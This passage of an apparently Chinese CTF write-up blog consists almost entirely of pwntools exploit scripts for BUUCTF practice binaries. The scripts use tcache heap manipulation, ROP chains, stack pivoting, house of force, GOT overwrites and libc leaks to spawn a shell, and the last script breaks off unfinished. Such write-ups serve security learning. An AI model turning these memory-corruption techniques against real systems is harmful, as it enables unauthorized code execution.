<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_final_2&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def addInt(num):</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;your inode number:&quot;)</span><br><span class="line">    sh.send(str(num))</span><br><span class="line">def showInt():</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    return sh.recvuntil(&quot;\n&quot;,True)</span><br><span class="line">def showShort():</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    return sh.recvuntil(&quot;\n&quot;,True)</span><br><span class="line">def addShort(num):</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;your inode number:&quot;)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line">def freeInt():</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">def freeShort():</span><br><span class="line">    sh.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;ciscn_2019_final_2&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeShort()</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeShort()</span><br><span class="line">    chunk_addr1 &#x3D; int(showShort(),10)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(0x91)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        freeInt()</span><br><span class="line">        addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr2 &#x3D; int(showInt(),10)</span><br><span class="line">    main_arena &#x3D; chunk_addr2 - 96</span><br><span class="line">    fileno &#x3D; main_arena - 0x1D8</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(0x100)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr3 &#x3D; int(showInt(),10)</span><br><span class="line">    addInt(chunk_addr3 - 0x30)</span><br><span class="line">    addInt(0x9999)</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(666)</span><br><span class="line">    sh.sendline(&quot;4&quot;)</span><br><span class="line">    if debug &#x3D;&#x3D; 1:</span><br><span class="line">        log.success(&quot;pid &#x3D; &quot; + str(sh.pid)) </span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;pwn.buuoj.cn&quot;,20231,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x40-强网杯2019-拟态-STKOF">0x40 强网杯2019 拟态 STKOF</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf1 &#x3D; ELF(&quot;__stkof&quot;)</span><br><span class="line">elf2 &#x3D; ELF(&quot;_stkof&quot;)</span><br><span class="line">sh1 &#x3D; 0</span><br><span class="line">sh2 &#x3D; 0</span><br><span class="line">def rop32():</span><br><span class="line">	p &#x3D; &#39;&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret</span><br><span class="line">	p +&#x3D; &#39;&#x2F;bin&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9064) # @ .data + 4</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080a8af6) # pop eax ; ret</span><br><span class="line">	p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056a85) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9f2) # pop ecx ; pop ebx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9060) # padding without overwrite ebx</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806e9cb) # pop edx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080d9068) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x08056040) # xor eax, eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807be5a) # inc eax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;I&#39;, 0x080495a3) # int 0x80</span><br><span class="line">	return p</span><br><span class="line">def rop64():</span><br><span class="line">	p &#x3D; &#39;&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b97c) # pop rax ; ret</span><br><span class="line">	p +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004005f6) # pop rdi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000405895) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043b9d5) # pop rdx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006a10e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000436ed0) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000040e09f) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004610a0) # add rax, 1 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000461645) # syscall ; ret</span><br><span class="line">	return p</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh1</span><br><span class="line">	global sh2</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		#sh1 &#x3D; process(&quot;.&#x2F;__stkof&quot;)</span><br><span class="line">		sh2 &#x3D; process(&quot;.&#x2F;_stkof&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	offset1  &#x3D; 272</span><br><span class="line">	payload  &#x3D; offset1 * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(0x0806b225)</span><br><span class="line">	offset2  &#x3D; 256</span><br><span class="line">	payload +&#x3D; p32(0) + rop64()</span><br><span class="line">	payload  &#x3D; payload.ljust(offset1 + offset2 + 4,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; rop32()</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node1.buuoj.cn&quot;,28669,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x41-ciscn-2019-ne-3">0x41 ciscn_2019_ne_3</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_ne_3&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_ne_3&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">	pop_ebx_ret &#x3D; 0x08048431</span><br><span class="line">	pop_ebp_ret &#x3D; 0x0804881b</span><br><span class="line">	pop3_ret &#x3D; 0x08048819</span><br><span class="line">	leave_ret &#x3D; 0x08048575</span><br><span class="line">	base &#x3D; 0x0804A800</span><br><span class="line">	sh.recvuntil(&quot;name?&quot;)</span><br><span class="line">	sh.send(&quot;a&quot; * 9)</span><br><span class="line">	sh.recvuntil(&quot;password:&quot;)</span><br><span class="line">	sh.send(&quot;-1\x00\x00&quot;+ p32(0x08048793) + p32(0x0804A060) + p32(0x500))</span><br><span class="line">	sh.recvuntil(&quot;):&quot;)</span><br><span class="line">	offset   &#x3D; 56 + 4 * 4</span><br><span class="line">	payload  &#x3D; offset * &#39;a&#39;</span><br><span class="line">	payload +&#x3D; p32(0x0804A064 + 4)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload  &#x3D; p32(elf.plt[&#39;read&#39;]) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">	payload +&#x3D; p32(pop_ebp_ret) + p32(base) + p32(leave_ret) </span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	payload  &#x3D; p32(0) + p32(elf.plt[&#39;puts&#39;]) + p32(pop_ebx_ret) + p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	payload +&#x3D; p32(elf.plt[&#39;read&#39;]) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recv(4))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload &#x3D; p32(0)*3 + p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20169,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x42-bcloud-bctf-2016">0x42 bcloud_bctf_2016</h2>
<h3 id="典型的house-of-force">典型的house of force</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;bcloud_bctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if size &gt; 0:</span><br><span class="line">		sh.recvuntil(&quot;:&quot;)</span><br><span class="line">		sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;bcloud_bctf_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(&quot;b&quot; * 0x40)</span><br><span class="line">	sh.recvuntil(&quot;b&quot; * 0x40)</span><br><span class="line">	heap_base &#x3D; (u32(sh.recv(4)) &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	topChunk &#x3D; heap_base + 0xd8</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.send(0x40 * &quot;a&quot;)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	sh.sendline(&quot;\xff&quot; * 0x4)</span><br><span class="line">	notesize_addr &#x3D; 0x0804B0A0</span><br><span class="line">	notelist_addr &#x3D; 0x0804B120</span><br><span class="line">	add(notesize_addr - topChunk - 0x10,&#39;&#39;)</span><br><span class="line">	payload &#x3D; p32(0x400) * 10</span><br><span class="line">	payload &#x3D; payload.ljust(0x0804B120 - 0x0804B0A0,&#39;\x00&#39;)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;free&#39;])</span><br><span class="line">	payload +&#x3D; p32(notesize_addr)</span><br><span class="line">	payload +&#x3D; p32(elf.got[&#39;__libc_start_main&#39;])</span><br><span class="line">	add(0x400,payload + &quot;\n&quot;)</span><br><span class="line">	edit(0,p32(elf.plt[&#39;puts&#39;]) + &quot;\n&quot;)</span><br><span class="line">	free(2)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	edit(0,p32(system) + &quot;\n&quot;)</span><br><span class="line">	edit(1,payload + p32(binsh) + &quot;\n&quot;)</span><br><span class="line">	free(3)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20020,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x43-web-of-sci-volga-2016">0x43 web_of_sci_volga_2016</h2>
<h3 id="leak-canary，然后普通的ROP">leak canary，然后普通的ROP</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;web_of_sci_volga_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		